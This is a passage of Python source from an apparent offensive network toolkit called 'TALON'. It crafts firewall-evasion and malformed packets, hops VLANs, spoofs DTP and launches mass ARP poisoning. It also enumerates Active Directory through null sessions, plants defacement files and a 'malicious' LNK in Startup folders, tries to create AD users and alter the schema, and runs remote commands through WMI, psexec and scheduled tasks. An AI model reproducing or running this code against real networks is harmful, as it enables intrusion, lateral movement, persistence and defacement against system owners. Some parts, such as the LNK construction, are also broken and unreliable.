        lambda: IP(dst=target_ip)/ICMP()/TCP(dport=target_port),
        lambda: IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=os.urandom(100)),
    ]
    
    active_traffic = True
    count = 0
    
    while active_traffic and count < 200:
        try:
            packet_func = random.choice(patterns)
            packet = packet_func()
            sendp(Ether(src=our_mac)/packet, iface=iface, verbose=False)
            captured_packets.append(packet)
            count += 1
            
            if count % 20 == 0:
                print(f"[Traffic] Sent {count} unusual packets")
            
            time.sleep(random.uniform(0.005, 0.05))
            
        except Exception as e:
            print(f"[Traffic Error] {e}")
    
    active_traffic = False
    print("[Traffic] Generation stopped")

# [Continuing from the previous code...]

def firewall_evasion(iface, target_ip):
    our_mac = get_if_hwaddr(iface)
    target_port = 80
    
    print(f"[FW-Evade] Targeting {target_ip} with evasion techniques")
    
    evasion_patterns = [
        lambda: IP(dst=target_ip)/TCP(dport=target_port, flags="S"),
        lambda: fragment(IP(dst=target_ip)/TCP(dport=target_port)/("A"*1500)),
        lambda: IP(dst=target_ip)/TCP(dport=target_port, chksum=0x0000),
        lambda: IP(dst=target_ip)/TCP(dport=target_port, reserved=7),
        lambda: IP(dst=target_ip, options=[(131, b'\x01\x02\x03\x04')])/TCP(dport=target_port),
        lambda: IP(dst=target_ip)/TCP(dport=target_port)/Raw(load="X"),
        lambda: IP(dst=target_ip, tos=0xFF)/TCP(dport=target_port),
    ]
    
    for i, packet_func in enumerate(evasion_patterns):
        try:
            for _ in range(3):
                packet = packet_func()
                sendp(Ether(src=our_mac)/packet, iface=iface, verbose=False)
                captured_packets.append(packet)
                time.sleep(0.1)
            print(f"[FW-Evade] Sent evasion pattern {i+1}")
        except Exception as e:
            print(f"[FW-Evade Error] {e}")

# RFC-breaking packets
def generate_rfc_breaking(iface, target_ip):
    our_mac = get_if_hwaddr(iface)
    
    print(f"[RFC-Break] Generating RFC-violating packets to {target_ip}")
    
    rfc_violations = [
        lambda: IP(version=0, dst=target_ip)/TCP(dport=80),
        lambda: IP(version=6, dst=target_ip)/TCP(dport=80),
        lambda: IP(ihl=4, dst=target_ip)/TCP(dport=80),
        lambda: IP(dst=target_ip)/TCP(dport=80, options=[(1, b'\x00')]),
        lambda: IP(dst=target_ip, options=[(0, b'\x00\x00\x00\x00')])/TCP(dport=80),
        lambda: IP(dst=target_ip)/TCP(dport=80, options=[(2, b'\x00\x01')]),
        lambda: IP(dst=target_ip, frag=0x1FFF)/TCP(dport=80),
        lambda: IP(dst=target_ip)/TCP(dport=80, flags="U", urgptr=0xFFFF),
    ]
    
    for i, packet_func in enumerate(rfc_violations):
        try:
            packet = packet_func()
            sendp(Ether(src=our_mac)/packet, iface=iface, verbose=False)
            captured_packets.append(packet)
            print(f"[RFC-Break] Sent violation {i+1}")
            time.sleep(0.3)
        except Exception as e:
            print(f"[RFC-Break Error] {e}")

# Manufacturer detection
def show_manufacturer_info():
    if not discovered:
        print("[Manuf] No hosts discovered. Run 'scan' first.")
        return
    
    print("\n[Manufacturer Information]")
    print("-" * 60)
    for mac, info in discovered.items():
        print(f"{mac:18} → {info['ip']:15} [{info['vendor']}]")
    print("-" * 60)

# Wireshark-style human readable output
def wireshark_view(limit=20):
    if not captured_packets:
        print("[Wireshark] No packets captured. Run sniff or traffic generation first.")
        return
    
    print(f"\n[Wireshark View - Last {min(limit, len(captured_packets))} packets]")
    print("=" * 80)
    
    for i, pkt in enumerate(list(captured_packets)[-limit:]):
        print(f"\nPacket {i+1}:")
        print(f"Time: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        
        if pkt.haslayer(Ether):
            print(f"Ethernet: {pkt[Ether].src} -> {pkt[Ether].dst}")
        
        if pkt.haslayer(IP):
            print(f"IP: {pkt[IP].src} -> {pkt[IP].dst} TTL:{pkt[IP].ttl}")
        
        if pkt.haslayer(TCP):
            flags = []
            if pkt[TCP].flags & 0x01: flags.append("FIN")
            if pkt[TCP].flags & 0x02: flags.append("SYN")
            if pkt[TCP].flags & 0x04: flags.append("RST")
            if pkt[TCP].flags & 0x08: flags.append("PSH")
            if pkt[TCP].flags & 0x10: flags.append("ACK")
            if pkt[TCP].flags & 0x20: flags.append("URG")
            print(f"TCP: {pkt[TCP].sport} -> {pkt[TCP].dport} Flags:[{'+'.join(flags)}]")
        
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if len(payload) > 50:
                payload = payload[:50] + b"..."
            print(f"Payload: {payload.hex()}")
        
        print("-" * 40)

# VLAN hopping and discovery
def vlan_hop(iface, vlan_id=None):
    our_mac = get_if_hwaddr(iface)
    
    if vlan_id:
        # Specific VLAN hopping
        print(f"[VLAN] Hopping to VLAN {vlan_id}")
        for i in range(1, 255):
            target_ip = f"10.{vlan_id}.{i}.1"
            pkt = Ether(src=our_mac)/Dot1Q(vlan=vlan_id)/ARP(pdst=target_ip)
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.01)
    else:
        # Discover VLANs
        print("[VLAN] Discovering VLANs...")
        for vlan in range(1, 4095):
            if vlan % 100 == 0:
                print(f"[VLAN] Testing VLAN {vlan}/4094")
            
            pkt = Ether(src=our_mac)/Dot1Q(vlan=vlan)/ARP(pdst="10.1.1.1")
            sendp(pkt, iface=iface, verbose=False, count=1)
            time.sleep(0.001)

# Extreme aggressive scanning
def extreme_scan(iface, base_cidr):
    print("[Extreme] Extreme aggressive scanning...")
    
    # Multiple network guesses
    common_nets = [
        "10.1.1.0/24", "192.168.1.0/24"
    ]
    
    for net in common_nets:
        print(f"[Extreme] Scanning {net}")
        eth_arp_scan(iface, net, timeout=3, aggressive=True)
        time.sleep(1)
    
    # VLAN discovery
    vlan_hop(iface)
    
    print("[Extreme] Scan complete.")

# Internal traffic analysis functions
def show_internal_traffic():
    """Show internal traffic patterns"""
    if not internal_traffic:
        print("[Internal] No internal traffic captured yet")
        return
    
    print("\n[Internal Traffic Analysis]")
    print("=" * 60)
    
    total_internal_packets = sum(sum(inner_dict.values()) for inner_dict in internal_traffic.values())
    print(f"Total internal packets: {total_internal_packets}")
    print(f"Unique internal conversations: {len(conversations)}")
    
    print("\nTop Internal Conversations:")
    print("-" * 40)
    # Flatten and sort conversations by packet count
    all_convos = []
    for src, destinations in internal_traffic.items():
        for dst, count in destinations.items():
            all_convos.append((src, dst, count))
    
    # Sort by count descending and show top 10
    for src, dst, count in sorted(all_convos, key=lambda x: x[2], reverse=True)[:10]:
        print(f"{src:15} ↔ {dst:15} : {count} packets")

def show_network_topology():
    """Show network communication patterns"""
    if not network_topology:
        print("[Topology] No network topology data yet")
        return
    
    print("\n[Network Topology Map]")
    print("" * 60)
    
    for device, peers in network_topology.items():
        print(f"{device:15} ↔ {', '.join(sorted(peers))}")

def show_device_profiles():
    """Show detailed device profiles"""
    if not device_profiles:
        print("[Profiles] No device profiles yet")
        return
    
    print("\n[Device Communication Profiles]")
    print("=" * 60)
    
    current_time = datetime.now()
    for device, profile in device_profiles.items():
        if is_internal_ip(device):
            status = "Active" if (current_time - profile['last_seen']).total_seconds() < 300 else "Inactive"
            print(f"\n{device:15} [{status}]")
            print(f"  Sent: {profile['packets_sent']:6} packets")
            print(f"  Received: {profile['packets_received']:6} packets")
            print(f"  Protocols: {', '.join(profile['protocols'])}")
            print(f"  First seen: {profile['first_seen'].strftime('%H:%M:%S')}")
            print(f"  Last seen: {profile['last_seen'].strftime('%H:%M:%S')}")

def detect_network_segments():
    """Attempt to detect network segments and subnets"""
    internal_ips = [ip for ip in device_profiles.keys() if is_internal_ip(ip)]
    
    if not internal_ips:
        print("[Segments] No internal IPs found")
        return
    
    print("\n[Network Segment Analysis]")
    print("=" * 60)
    
    # Group by subnets
    subnets = defaultdict(list)
    for ip in internal_ips:
        ip_obj = ipaddress.ip_address(ip)
        # Get /24 subnet
        subnet = ".".join(ip.split(".")[:3]) + ".0/24"
        subnets[subnet].append(ip)
    
    for subnet, devices in subnets.items():
        print(f"\n{subnet:15} : {len(devices)} devices")
        for device in sorted(devices):
            print(f"  {device}")

# Active Directory enumeration functions
def ad_enumerate(target_ip):
    """Perform basic Active Directory enumeration without credentials"""
    print(f"[AD] Enumerating Active Directory on {target_ip}")
    
    # Try to get domain information
    try:
        result = subprocess.run(['nslookup', '-type=SRV', '_ldap._tcp.dc._msdcs', target_ip], 
                              capture_output=True, text=True, timeout=10)
        if "SRV" in result.stdout:
            print("[AD] Domain Controller SRV records found:")
            for line in result.stdout.split('\n'):
                if "svr hostname" in line.lower():
                    print(f"  {line.strip()}")
    except:
        pass
    
    # Check for anonymous LDAP access
    try:
        result = subprocess.run(['ldapsearch', '-x', '-h', target_ip, '-b', '', '-s', 'base', 
                               '(objectClass=*)', 'defaultNamingContext'], 
                              capture_output=True, text=True, timeout=15)
        if "defaultNamingContext" in result.stdout:
            print("[AD] Anonymous LDAP bind successful")
            for line in result.stdout.split('\n'):
                if "defaultNamingContext" in line:
                    print(f"  {line.strip()}")
    except:
        print("[AD] Anonymous LDAP bind failed")
    
    # Check for SMB null session
    try:
        result = subprocess.run(['smbclient', '-L', target_ip, '-N'], 
                              capture_output=True, text=True, timeout=10)
        if "Sharename" in result.stdout:
            print("[AD] SMB null session successful. Shares found:")
            for line in result.stdout.split('\n'):
                if "Disk" in line or "IPC" in line:
                    print(f"  {line.strip()}")
    except:
        print("[AD] SMB null session failed")
    
    # Check RPC for domain information
    try:
        result = subprocess.run(['rpcclient', '-U', '', '-N', target_ip, '-c', 'getdompwinfo'], 
                              capture_output=True, text=True, timeout=10)
        if "Domain Password Info" in result.stdout:
            print("[AD] RPC null session successful")
            print(result.stdout)
    except:
        print("[AD] RPC null session failed")

def ad_get_users(target_ip):
    """Attempt to extract AD user information without credentials"""
    print(f"[AD] Attempting to extract user information from {target_ip}")
    
    # Try LDAP anonymous user enumeration
    try:
        result = subprocess.run(['ldapsearch', '-x', '-h', target_ip, '-b', 'dc=domain,dc=com', 
                               '(objectClass=user)', 'sAMAccountName'], 
                              capture_output=True, text=True, timeout=20)
        if "sAMAccountName" in result.stdout:
            print("[AD] Users found via anonymous LDAP:")
            users = []
            for line in result.stdout.split('\n'):
                if "sAMAccountName:" in line:
                    user = line.split(':')[1].strip()
                    users.append(user)
                    print(f"  {user}")
            return users
    except:
        pass
    
    # Try RPC user enumeration
    try:
        result = subprocess.run(['rpcclient', '-U', '', '-N', target_ip, '-c', 'enumdomusers'], 
                              capture_output=True, text=True, timeout=15)
        if "user:" in result.stdout:
            print("[AD] Users found via RPC:")
            for line in result.stdout.split('\n'):
                if "user:" in line:
                    print(f"  {line.strip()}")
    except:
        print("[AD] User enumeration failed")
    
    return []

def ad_get_groups(target_ip):
    """Attempt to extract AD group information without credentials"""
    print(f"[AD] Attempting to extract group information from {target_ip}")
    
    # Try LDAP anonymous group enumeration
    try:
        result = subprocess.run(['ldapsearch', '-x', '-h', target_ip, '-b', 'dc=domain,dc=com', 
                               '(objectClass=group)', 'cn'], 
                              capture_output=True, text=True, timeout=20)
        if "cn:" in result.stdout:
            print("[AD] Groups found via anonymous LDAP:")
            for line in result.stdout.split('\n'):
                if "cn:" in line and not "#" in line:
                    print(f"  {line.strip()}")
    except:
        pass
    
    # Try RPC group enumeration
    try:
        result = subprocess.run(['rpcclient', '-U', '', '-N', target_ip, '-c', 'enumdomgroups'], 
                              capture_output=True, text=True, timeout=15)
        if "group:" in result.stdout:
            print("[AD] Groups found via RPC:")
            for line in result.stdout.split('\n'):
                if "group:" in line:
                    print(f"  {line.strip()}")
    except:
        print("[AD] Group enumeration failed")

def ad_get_computers(target_ip):
    """Attempt to extract AD computer information without credentials"""
    print(f"[AD] Attempting to extract computer information from {target_ip}")
    
    # Try LDAP anonymous computer enumeration
    try:
        result = subprocess.run(['ldapsearch', '-x', '-h', target_ip, '-b', 'dc=domain,dc=com', 
                               '(objectClass=computer)', 'cn'], 
                              capture_output=True, text=True, timeout=20)
        if "cn:" in result.stdout:
            print("[AD] Computers found via anonymous LDAP:")
            for line in result.stdout.split('\n'):
                if "cn:" in line and not "#" in line:
                    print(f"  {line.strip()}")
    except:
        pass
    
    # Try net view for computers
    try:
        result = subprocess.run(['net', 'view', '/domain'], 
                              capture_output=True, text=True, timeout=10)
        if "\\\\" in result.stdout:
            print("[AD] Computers found via net view:")
            for line in result.stdout.split('\n'):
                if "\\\\" in line:
                    print(f"  {line.strip()}")
    except:
        print("[AD] Computer enumeration failed")

def ad_get_gpo_info(target_ip):
    """Attempt to extract GPO information from SYSVOL share"""
    print(f"[AD] Attempting to extract GPO information from {target_ip}")
    
    # Try to access SYSVOL share anonymously
    try:
        result = subprocess.run(['smbclient', f'\\\\{target_ip}\\SYSVOL', '-N', '-c', 'ls'], 
                              capture_output=True, text=True, timeout=15)
        if "NT_STATUS_ACCESS_DENIED" not in result.stderr:
            print("[AD] SYSVOL share accessible anonymously")
            print(result.stdout)
            
            # Try to list GPO directories
            result = subprocess.run(['smbclient', f'\\\\{target_ip}\\SYSVOL', '-N', '-c', 'ls *'], 
                                  capture_output=True, text=True, timeout=15)
            print("[AD] GPO directories found:")
            print(result.stdout)
        else:
            print("[AD] SYSVOL share not accessible anonymously")
    except:
        print("[AD] GPO enumeration failed")

def ad_get_ou_structure(target_ip):
    """Attempt to extract OU structure without credentials"""
    print(f"[AD] Attempting to extract OU structure from {target_ip}")
    
    try:
        result = subprocess.run([
            'ldapsearch', '-x', '-h', target_ip, '-b', 'dc=domain,dc=com',
            '(objectClass=organizationalUnit)', 'ou'
        ], capture_output=True, text=True, timeout=20)
        
        if "ou:" in result.stdout:
            print("[AD] Organizational Units found:")
            for line in result.stdout.split('\n'):
                if "ou:" in line and not "#" in line:
                    print(f"  {line.strip()}")
        else:
            print("[AD] No OU structure accessible anonymously")
    except Exception as e:
        print(f"[AD] OU enumeration failed: {e}")

def ad_get_domain_trusts(target_ip):
    """Attempt to discover domain trusts"""
    print(f"[AD] Attempting to discover domain trusts from {target_ip}")
    
    try:
        # Try nltest for domain trusts
        result = subprocess.run(['nltest', '/domain_trusts'], 
                              capture_output=True, text=True, timeout=15)
        if "Trusted domain names" in result.stdout:
            print("[AD] Domain trusts found:")
            for line in result.stdout.split('\n'):
                if line.strip() and not "The command completed successfully" in line:
                    print(f"  {line.strip()}")
    except Exception as e:
        print(f"[AD] Trust discovery failed: {e}")

# Active Directory Evidence Planting Functions
def ad_leave_evidence(target_ip, evidence_type="message", content="TALON WAS HERE"):
    """Leave evidence in Active Directory or on accessible shares"""
    print(f"[Evidence] Planting evidence on {target_ip} ({evidence_type})")
    
    evidence_planted = False
    
    # Try SMB shares first
    try:
        result = subprocess.run(['smbclient', '-L', target_ip, '-N'], 
                              capture_output=True, text=True, timeout=10)
        if "Sharename" in result.stdout:
            shares = []
            for line in result.stdout.split('\n'):
                if "Disk" in line and "IPC" not in line:
                    share_name = line.split()[0]
                    shares.append(share_name)
            
            for share in shares[:2]:  # Try first 2 shares
                if plant_evidence_smb(target_ip, share, evidence_type, content):
                    evidence_planted = True
    except:
        pass
    
    # Try AD-based evidence
    if not evidence_planted:
        try:
            if evidence_type == "message":
                # Modify description field of a common user
                result = subprocess.run([
                    'ldapmodify', '-x', '-h', target_ip, '-D', '', '-w', '',
                    '-f', f'<(echo "dn: CN=Users,DC=domain,DC=com\nchangetype: modify\nreplace: description\ndescription: {content}")'
                ], shell=True, capture_output=True, timeout=15)
                if result.returncode == 0:
                    print(f"[Evidence] Message planted in AD description field")
                    evidence_planted = True
        except:
            pass
    
    return evidence_planted

def plant_evidence_smb(target_ip, share, evidence_type, content):
    """Plant evidence on SMB share"""
    try:
        if evidence_type == "message":
            # Create a text file
            with open('talon_message.txt', 'w') as f:
                f.write(content + "\n")
                f.write("Timestamp: " + datetime.now().isoformat() + "\n")
            
            # Copy to share
            result = subprocess.run([
                'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 
                f'put talon_message.txt TALON_EVIDENCE.txt'
            ], capture_output=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[Evidence] Message file planted on {share} share")
                return True
                
        elif evidence_type == "wallpaper":
            # Create a simple BMP wallpaper
            create_wallpaper(content)
            
            # Copy to potential wallpaper locations
            locations = [
                'Windows\\Temp\\talon_wallpaper.bmp',
                'Users\\Public\\Pictures\\talon_wallpaper.bmp'
            ]
            
            for location in locations:
                result = subprocess.run([
                    'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 
                    f'put talon_wallpaper.bmp {location}'
                ], capture_output=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"[Evidence] Wallpaper planted at {location} on {share}")
                    return True
                    
        elif evidence_type == "lnk":
            # Create malicious LNK file
            create_malicious_lnk(target_ip)
            
            # Copy to startup or desktop locations
            locations = [
                'Users\\Public\\Desktop\\Important_Update.lnk',
                'ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\System_Update.lnk'
            ]
            
            for location in locations:
                result = subprocess.run([
                    'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 
                    f'put malicious.lnk {location}'
                ], capture_output=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"[Evidence] LNK file planted at {location} on {share}")
                    return True
    
    except Exception as e:
        print(f"[Evidence] Failed to plant evidence on {share}: {e}")
    
    return False

def create_wallpaper(message):
    """Create a simple BMP wallpaper with message"""
    # Simple BMP header and content
    bmp_header = bytes([
        0x42, 0x4D, 0x36, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00,
        0x28, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x01, 0x00,
        0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ])
    
    # Create simple image with message
    with open('talon_wallpaper.bmp', 'wb') as f:
        f.write(bmp_header)
        # Add some pixel data (simplified)
        for i in range(64*64):
            f.write(bytes([255, 0, 0]))  # Red pixels

def create_malicious_lnk(target_ip):
    """Create LNK file that executes when opened"""
    lnk_content = f'''[InternetShortcut]
URL=file:///c:/windows/system32/cmd.exe
WorkingDirectory=c:\\windows\\system32
IconFile=\\\\{target_ip}\\share\\icon.ico
IconIndex=0
HotKey=0
IDList=
'''
    
    with open('malicious.lnk', 'w') as f:
        f.write(lnk_content)

def ad_create_user(target_ip, username, password):
    """Attempt to create a user in Active Directory"""
    print(f"[AD] Attempting to create user {username} on {target_ip}")
    
    try:
        # Try LDAP add operation
        ldif_content = f"""dn: CN={username},CN=Users,DC=domain,DC=com
changetype: add
objectClass: user
sAMAccountName: {username}
userPrincipalName: {username}@domain.com
displayName: {username}
userAccountControl: 512
unicodePwd: "{password}"
"""
        
        with open('create_user.ldif', 'w') as f:
            f.write(ldif_content)
        
        result = subprocess.run([
            'ldapadd', '-x', '-h', target_ip, '-D', '', '-w', '', '-f', 'create_user.ldif'
        ], capture_output=True, timeout=15)
        
        if result.returncode == 0:
            print(f"[AD] Successfully created user {username}")
            return True
        else:
            print(f"[AD] User creation failed: {result.stderr}")
            
    except Exception as e:
        print(f"[AD] User creation error: {e}")
    
    return False

def ad_modify_schema(target_ip):
    """Attempt to modify AD schema (advanced persistence)"""
    print(f"[AD] Attempting schema modification on {target_ip}")
    
    try:
        # Try to add a custom attribute
        schema_ldif = """dn: CN=talon-attrib,CN=Schema,CN=Configuration,DC=domain,DC=com
changetype: add
objectClass: attributeSchema
cn: talon-attrib
adminDescription: TALON Custom Attribute
attributeID: 1.3.6.1.4.1.9999.9999.1
attributeSyntax: 2.5.5.12
oMSyntax: 64
isSingleValued: TRUE
"""
        
        with open('schema_mod.ldif', 'w') as f:
            f.write(schema_ldif)
        
        result = subprocess.run([
            'ldapmodify', '-x', '-h', target_ip, '-D', '', '-w', '', '-f', 'schema_mod.ldif'
        ], capture_output=True, timeout=20)
        
        if result.returncode == 0:
            print("[AD] Schema modification successful")
            return True
            
    except Exception as e:
        print(f"[AD] Schema modification failed: {e}")
    
    return False

# Lateral Movement Functions
def enum_shares(target_ip, username=None, password=None):
    """Enumerate SMB shares on target"""
    print(f"[SMB] Enumerating shares on {target_ip}")
    
    auth_args = []
    if username and password:
        auth_args = ['-U', f'{username}%{password}']
    else:
        auth_args = ['-N']  # Null session
    
    try:
        result = subprocess.run(['smbclient', '-L', target_ip] + auth_args, 
                              capture_output=True, text=True, timeout=15)
        
        if "Sharename" in result.stdout:
            print(f"[SMB] Shares found on {target_ip}:")
            for line in result.stdout.split('\n'):
                if "Disk" in line or "IPC" in line or "Print" in line:
                    print(f"  {line.strip()}")
            return True
        else:
            print(f"[SMB] No shares found or access denied: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[SMB] Share enumeration failed: {e}")
        return False

def enum_services(target_ip, username=None, password=None):
    """Enumerate services on target"""
    print(f"[Services] Enumerating services on {target_ip}")
    
    try:
        # Try to use net view for service enumeration
        result = subprocess.run(['net', 'view', f'\\\\{target_ip}'], 
                              capture_output=True, text=True, timeout=10)
        
        if "Shared resources" in result.stdout:
            print(f"[Services] Services found on {target_ip}:")
            for line in result.stdout.split('\n'):
                if line.strip() and not "Shared resources" in line and not "---" in line:
                    print(f"  {line.strip()}")
            return True
        else:
            print(f"[Services] No services found or access denied")
            
        # Try to use rpcclient for more detailed enumeration
        auth_args = []
        if username and password:
            auth_args = ['-U', f'{username}%{password}']
        else:
            auth_args = ['-N']  # Null session
            
        result = subprocess.run(['rpcclient', '-c', 'enumprivs', target_ip] + auth_args, 
                              capture_output=True, text=True, timeout=15)
        
        if "Se" in result.stdout:
            print(f"[Services] Privileges found:")
            for line in result.stdout.split('\n'):
                if "Se" in line:
                    print(f"  {line.strip()}")
                    
    except Exception as e:
        print(f"[Services] Service enumeration failed: {e}")
    
    return False

def copy_file(target_ip, local_file, remote_path, username=None, password=None):
    """Copy file to remote system via SMB"""
    print(f"[Copy] Copying {local_file} to {target_ip}:{remote_path}")
    
    auth_args = []
    if username and password:
        auth_args = ['-U', f'{username}%{password}']
    else:
        auth_args = ['-N']  # Null session
    
    try:
        # First try to find a writable share
        result = subprocess.run(['smbclient', '-L', target_ip] + auth_args, 
                              capture_output=True, text=True, timeout=10)
        
        writable_shares = []
        for line in result.stdout.split('\n'):
            if "Disk" in line and "IPC" not in line:
                share_name = line.split()[0]
                writable_shares.append(share_name)
        
        if not writable_shares:
            print("[Copy] No writable shares found")
            return False
        
        # Try to copy to each share until successful
        for share in writable_shares:
            try:
                result = subprocess.run([
                    'smbclient', f'\\\\{target_ip}\\{share}'] + auth_args + [
                    '-c', f'put {local_file} {remote_path}'
                ], capture_output=True, timeout=15)
                
                if result.returncode == 0:
                    print(f"[Copy] Successfully copied to {share}")
                    return True
            except:
                continue
        
        print("[Copy] Failed to copy to any share")
        return False
        
    except Exception as e:
        print(f"[Copy] File copy failed: {e}")
        return False

def exec_command(target_ip, command, username=None, password=None):
    """Execute command on remote system"""
    print(f"[Exec] Executing command on {target_ip}: {command}")
    
    # Try multiple methods for command execution
    methods = []
    
    # Method 1: WMI (if credentials available)
    if username and password:
        try:
            wmi_command = f'wmic /node:{target_ip} /user:{username} /password:{password} process call create "{command}"'
            result = subprocess.run(wmi_command, shell=True, capture_output=True, timeout=15)
            if result.returncode == 0:
                print("[Exec] Command executed via WMI")
                return True
        except:
            pass
    
    # Method 2: psexec (if available)
    try:
        if username and password:
            psexec_cmd = ['psexec', f'\\\\{target_ip}', '-u', username, '-p', password, command]
        else:
            psexec_cmd = ['psexec', f'\\\\{target_ip}', command]
            
        result = subprocess.run(psexec_cmd, capture_output=True, timeout=15)
        if result.returncode == 0:
            print("[Exec] Command executed via psexec")
            return True
    except:
        pass
    
    # Method 3: SMB + scheduled task (advanced)
    try:
        # Create a batch file with the command
        bat_content = f'@echo off\n{command}\n'
        with open('temp_cmd.bat', 'w') as f:
            f.write(bat_content)
        
        # Copy to ADMIN$ share
        if copy_file(target_ip, 'temp_cmd.bat', 'Windows\\Temp\\temp_cmd.bat', username, password):
            # Schedule execution
            if username and password:
                sch_cmd = f'schtasks /create /s {target_ip} /u {username} /p {password} /tn "TempTask" /tr "C:\\Windows\\Temp\\temp_cmd.bat" /sc once /st 00:00'
            else:
                sch_cmd = f'schtasks /create /s {target_ip} /tn "TempTask" /tr "C:\\Windows\\Temp\\temp_cmd.bat" /sc once /st 00:00'
            
            result = subprocess.run(sch_cmd, shell=True, capture_output=True, timeout=15)
            if result.returncode == 0:
                print("[Exec] Command scheduled for execution")
                return True
    except Exception as e:
        print(f"[Exec] Scheduled task method failed: {e}")
    
    print("[Exec] All command execution methods failed")
    return False

def change_wallpaper(target_ip, username=None, password=None):
    """Change wallpaper on remote system"""
    print(f"[Wallpaper] Attempting to change wallpaper on {target_ip}")
    
    # Create a simple BMP wallpaper
    create_wallpaper("TALON WAS HERE")
    
    # Try to copy to remote system
    if copy_file(target_ip, 'talon_wallpaper.bmp', 'Windows\\Temp\\talon_wallpaper.bmp', username, password):
        # Try to set wallpaper via registry
        reg_command = 'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Temp\\talon_wallpaper.bmp" /f'
        
        if exec_command(target_ip, reg_command, username, password):
            # Refresh wallpaper
            refresh_cmd = 'RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
            if exec_command(target_ip, refresh_cmd, username, password):
                print("[Wallpaper] Wallpaper changed successfully")
                return True
    
    print("[Wallpaper] Failed to change wallpaper")
    return False

def rdp_hijack(target_ip, username=None, password=None):
    """Attempt RDP session hijacking"""
    print(f"[RDP] Attempting RDP session hijacking on {target_ip}")
    
    # Method 1: Check for existing RDP sessions
    try:
        if username and password:
            query_cmd = f'query user /server:{target_ip}'
            result = subprocess.run(query_cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if "Active" in result.stdout:
                print("[RDP] Active sessions found:")
                print(result.stdout)
                
                # Try to hijack a session (requires specific tools)
                # This is a placeholder for actual hijacking techniques
                print("[RDP] Session hijacking would require additional tools")
                return True
        else:
            print("[RDP] Credentials required for session enumeration")
            
    except Exception as e:
        print(f"[RDP] Session enumeration failed: {e}")
    
    # Method 2: Check RDP security settings
    try:
        reg_command = 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections'
        result = exec_command(target_ip, reg_command, username, password)
        
        if result and "0x0" in result:
            print("[RDP] RDP is enabled on target")
            
            # Check security layer
            sec_command = 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v SecurityLayer'
            sec_result = exec_command(target_ip, sec_command, username, password)
            
            if sec_result:
                print(f"[RDP] Security layer: {sec_result}")
                return True
                
    except Exception as e:
        print(f"[RDP] Security check failed: {e}")
    
    print("[RDP] RDP hijacking attempts completed")
    return False

# Auto-mode: Automated reconnaissance sequence
def auto_mode(iface, base_cidr):
    """Run automated reconnaissance and attack sequence on discovered hosts"""
    print("[Auto] Starting automated reconnaissance sequence...")
    
    # Phase 1: Initial discovery
    print("[Auto] Phase 1: Network discovery")
    eth_arp_scan(iface, base_cidr, aggressive=True)
    
    if discovered:
        print(f"[Auto] Found {len(discovered)} hosts")
        show_manufacturer_info()
        
        # Phase 2: Port scanning and service discovery
        print("[Auto] Phase 2: Port scanning and service discovery")
        for mac, info in discovered.items():
            target_ip = info['ip']
            print(f"[Auto] Scanning {target_ip}")
            port_scan(target_ip, COMMON_PORTS[:20])  # Scan top 20 common ports
            service_discovery(target_ip, ports=[80, 443, 445, 3389])  # Focus on key services
            time.sleep(1)
        
        # Phase 3: Traffic analysis
        print("[Auto] Phase 3: Traffic generation and analysis")
        sniff_thread = threading.Thread(target=eth_sniff_flows, args=(iface,), daemon=True)
        sniff_thread.start()
        
        # Generate traffic to all discovered hosts
        for mac, info in discovered.items():
            print(f"[Auto] Probing {info['ip']}")
            firewall_evasion(iface, info['ip'])
            generate_rfc_breaking(iface, info['ip'])
            time.sleep(1)
        
        # Phase 4: Mass attack
        print("[Auto] Phase 4: Mass ARP poisoning")
        mass_attack(iface)
        
        # Phase 5: AD enumeration (if AD hosts found)
        print("[Auto] Phase 5: Active Directory enumeration")
        for mac, info in discovered.items():
            target_ip = info['ip']
            # Check if this might be a DC
            if any(scan_port(target_ip, port) for port in AD_PORTS):
                print(f"[Auto] Found potential DC: {target_ip}")
                ad_enumerate(target_ip)
                ad_get_users(target_ip)
                time.sleep(2)
        
        # Phase 6: Analysis
        print("[Auto] Phase 6: Analysis")
        wireshark_view(30)
        show_manufacturer_info()
        show_internal_traffic()
        
        time.sleep(5)
        global active_traffic
        active_traffic = False
        
    else:
        print("[Auto] No hosts found, trying extreme scan...")
        extreme_scan(iface, base_cidr)
    
    print("[Auto] Sequence complete.")

# [ADDING ALL THE NEW L2/L3 ATTACK FUNCTIONS HERE]

def dtp_spoofing_attack(iface, target_mac=None, desired_state="dynamic_auto"):
    """
    Perform DTP spoofing to negotiate a trunk port
    """
    print(f"[DTP] Spoofing Dynamic Trunking Protocol on {iface}")
    
    our_mac = get_if_hwaddr(iface)
    if not target_mac:
        # Find a Cisco device if possible
        for mac, info in discovered.items():
            if 'cisco' in info['vendor'].lower() or 'Cisco' in info['vendor']:
                target_mac = mac
                break
        if not target_mac:
            target_mac = "01:00:0c:cc:cc:cc"  # Cisco multicast
    
    # DTP packet crafting
    dtp_packet = Ether(dst=target_mac, src=our_mac)/ \
                LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                SNAP(OUI=0x0c, code=0x2004)/ \
                Raw(load=bytes.fromhex("0001000100040000"))
    
